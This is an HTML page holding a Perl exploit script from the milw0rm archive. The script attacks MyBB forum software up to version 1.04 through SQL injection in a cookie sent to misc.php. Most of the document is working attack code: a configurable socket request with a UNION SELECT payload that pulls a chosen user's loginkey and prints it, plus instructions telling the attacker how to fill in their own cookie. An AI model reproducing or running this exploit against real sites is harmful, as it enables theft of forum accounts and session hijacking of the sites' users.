<html><head><title>MyBulletinBoard (MyBB) <= 1.04 (misc.php COMMA) SQL Injection (2)</title></head><pre>#!/usr/bin/perl -w

# MyBB &lt;= 1.04 (misc.php COMMA) Remote SQL Injection Exploit 2 , Perl C0d3
#
# Milw0rm ID :-
#			http://www.milw0rm.com/auth.php?id=1539
# D3vil-0x1 | Devil-00 &lt; BlackHat &gt; :)
#
# DONT FORGET TO DO YOUR CONFIG !!
# DONT FORGET TO DO YOUR CONFIG !!
# DONT FORGET TO DO YOUR CONFIG !!
use IO::Socket;

##-- Start --#

$host 	= &quot;127.0.0.1&quot;;
$path		= &quot;/mybb3/&quot;;
$userid	= 1;
$mycookie 	= &quot;mybbuser=1_xommhw5h9kZZGSFUppacVfacykK1gnd84PLehjlhTGC1ZiQkXr;&quot;;

##-- _END_ --##
#	$host		:-
#				The Host Name Without http:// | exm. www.vic.com
#
#	$path		:-
#				MyBB Dir On Server | exm. /mybb/
#
#	$userid	:-
#				The ID Of The User U Wanna To Get His Loginkey
#
#	$cookie	:-
#				You Must Register Username And Get YourCookies ( mybb_user ) Then But it Like This
#	
#				$cookie 	= &quot;mybbuser=[YourID]_[YourLoginkey];&quot;;
$sock = IO::Socket::INET-&gt;new (
										PeerAddr =&gt; &quot;$host&quot;,
										PeerPort	=&gt; &quot;80&quot;,
										Proto		=&gt; &quot;tcp&quot;
										) or die(&quot;[!] Connect To Server Was Filed&quot;);
##-- DONT TRY TO EDIT ME --##										
$evilcookie = &quot;comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=$userid/*;&quot;;
##-- DONT TRY TO EDIT ME --##						
$evildata  = &quot;GET &quot;.$path.&quot;misc.php?action=buddypopup HTTP/1.1\n&quot;;
$evildata .= &quot;Host: $host \n&quot;;
$evildata .= &quot;Accept: */* \n&quot;;
$evildata .= &quot;Keep-Alive: 300\n&quot;;
$evildata .= &quot;Connection: keep-alive \n&quot;;
$evildata .= &quot;Cookie: &quot;.$mycookie.&quot; &quot;.$evilcookie.&quot;\n\n&quot;;

print $sock $evildata;

while($ans = &lt;$sock&gt;){
	$ans =~ m/&lt;a href=\&quot;member.php\?action=profile&amp;amp;uid=1\&quot; target=\&quot;_blank\&quot;&gt;(.*?)&lt;\/a&gt;&lt;\/span&gt;&lt;\/td&gt;/ &amp;&amp; print &quot;[+] Loginkey is :- &quot;.$1.&quot;\n&quot;;
}

# milw0rm.com [2006-03-03]</pre></html>